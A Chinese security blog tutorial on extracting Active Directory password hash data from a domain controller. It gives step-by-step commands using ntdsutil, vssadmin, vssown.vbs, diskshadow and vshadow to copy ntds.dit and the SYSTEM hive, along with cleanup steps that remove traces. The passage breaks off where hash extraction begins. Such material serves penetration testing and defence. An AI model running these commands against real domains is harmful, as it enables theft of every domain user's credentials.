---
title: 域控导出hash的多种姿势总结，建议收藏
url: https://www.secpulse.com/archives/195792.html
source: 安全脉搏
date: 2023-02-14
fetch_date: 2025-10-04T06:30:35.827801
---

# 域控导出hash的多种姿势总结，建议收藏

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 域控导出hash的多种姿势总结，建议收藏

[系统安全](https://www.secpulse.com/archives/category/articles/system)

[黑客前沿](https://www.secpulse.com/newpage/author?author_id=49332)

2023-02-13

36,745

## 域用户hash导出原理

ntds.dit为AD的数据库，内容有域用户、域组、用户hash等信息，域控上的ntds.dit只有可以登录到域控的用户（如域管用户、DC本地管理员用户）可以访问。
ntds.dit包括三个主要表：数据表、链接表、sd表。所以只要在域渗透中能够获取到ntds.dit就可以获取到所有域用户的用户名和对应的hash，ntds.dit是加密的，需要获取system文件来解密。

ntds.dit文件位置:

`C:WindowsNTDSNTDS.dit`

system文件位置:

`C:WindowsSystem32configSYSTEM`

在通常的情况下,即使我们拥有域管理员权限也无法读取ntds.dit文件,因为活动目录始终访问着这个文件,所以禁止读取,使用windows的本地卷影拷贝可以获得文件的副本。

## ntds.dit和system文件提取

### 0x01 ntdsutil

Ntdsutil.exe 是一个为 Active Directory 提供管理设施的命令行工具。您可使用 Ntdsutil.exe 执行 Active Directory 的数据库维护，管理和控制单个主机操作，创建应用程序目录分区，以及删除由未使用 Active Directory 安装向导 (DCPromo.exe) 成功降级的域控制器留下的元数据。—— 百度百科

简单讲，Ntdsutil.exe就是一个AD域的命令行工具，可以复制域控系统快照并从中提取ntds.dit文件。

#### 创建快照

`ntdsutil snapshot "activate instance ntds" create quit quit`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270694.png)

#### 加载快照

`ntdsutil snapshot "mount {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" quit quit`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270695.png)

#### 拷贝快照中的ntds.dit和system文件

`copy C:$SNAP_202302081523_VOLUMEC$WindowsNTDSntds.dit C:usersadministratordesktop`
`copy C:$SNAP_202302081523_VOLUMEC$WindowsSystem32configSYSTEM C:usersadministratordesktop`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270696.png)

#### 卸载快照并删除

`ntdsutil snapshot "unmount {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" "delete {0cf3ebc8-3f7a-415f-95f7-8e8cf923cecb}" quit quit`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270697.png)

### 0x02 vssadmin

vssadminn是Windows Server 2008及 Windows 7提供的VSS管理工具，可用于创建和删除卷影拷贝、列出卷影拷贝的信息（只能管理系统Provider 创建的卷影拷贝)、显示已安装的所有卷影拷贝写入程序( writers )和提供程序( providers )，以及改变卷影拷贝的存储空间(即所谓的“diff空间”)的大小等。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270698.png)

#### 创建卷影拷贝

`vssadmin create shadow /for=c:`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270699.png)

#### 拷贝卷影中的ntds.dit和system文件

`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy3windowsNTDSntds.dit c:usersadministratordesktopntds.dit`
`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy3WindowsSystem32configSYSTEM C:usersadministratordesktopSYSTEM`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762706991.png)

#### 删除卷影拷贝

`vssadmin delete shadows /for=c: /quiet`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270700.png)

### 0x03 vssown.vbs

功能和vssadmin类似，一个可视化的脚本，可以创建和删除卷影副本，从卸载的卷影副本运行任意可执行文件，以及启动和停止卷影复制服务。

下载地址：

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

#### 启动卷影拷贝服务

`cscript vssown.vbs /start`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762707001.png)

#### 创建卷影拷贝

`cscript vssown.vbs /create c`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762707002.png)

#### 列出卷影信息

`cscript vssown.vbs /list`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270701.png)

#### 拷贝卷影中的ntds.dit和system文件

`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy4windowsntdsntds.dit C:usersadministratordesktopntds.dit`
`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy4windowssystem32configSYSTEM C:usersadministratordesktopSYSTEM`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762707011.png)

#### 删除卷影拷贝

`cscript vssown.vbs /delete {FBC1881F-ADF7-411B-AF81-2BE16D400A15}`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270702.png)

### 0x04 diskshadow

DiskShadow是Microsoft签名的二进制文件，用于协助管理员执行与卷复制服务（VSS）相关的操作。该文件可以使用脚本模式，执行脚本中的所有命令，因此可以将拷贝ntds.dit文件的命令写入脚本中(c:1.txt)：

```
#设置卷影拷贝

set context persistent nowriters

#添加卷

add volume c: alias someAlias

#创建快照

create

#分配虚拟磁盘盘符

expose %someAlias% g:

#复制ntds.dit和system文件

exec "cmd.exe" /c copy g:windowsntdsntds.dit c:usersadministratordesktopntds.dit && copy g:windowssystem32configSYSTEM c:usersadministratordesktopSYSTEM

#删除所有快照

delete shadows all

#重置

reset

#退出

exit
```

命令行执行：

```
diskshadow.exe /s c:1.txt

//注意这里一定要将目录切到c:windowssystem32下，不然会报错，脚本中的注释去掉
```

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762707021.png)

### 0x05 vshadow

vshadow是一个简单的指令行工具，它允许任何人创建卷影拷贝。用户可以在最新版本的VSS SDK中找到这个工具。功能类似vssadmin，需要将系统对应版本的vshadow程序拷贝到系统中。

方法一：

#### 创建卷影拷贝

`vshadow-2008-r2-x64.exe -exec=%ComSpec% C:`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270703.png)

#### 拷贝卷影中的ntds.dit和system文件

`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy6windowsntdsntds.dit c:usersadministratordesktopntds.dit`
`copy \?GLOBALROOTDeviceHarddiskVolumeShadowCopy6windowssystem32configSYSTEM c:usersadministratordesktopSYSTEM`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-16762707031.png)

#### 卸载卷影

无需卸载，不会留下挂载痕迹。

方法二：

将vshadow-2008-r2-x64.exe改名为vshadow.exe，放在c.bat同目录下，命令行执行：
`c.bat c:windowsntdsntds.dit c:`

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-195792-1676270704.png)

**公众号回复 vshadow 获取工具，解压密码：公众号黑客前沿**

## 获取hash

### 0x01 NTDSDumpEx

ntds.dit和system文件拷贝到本地，NTDSDumpEx执行以下命令：...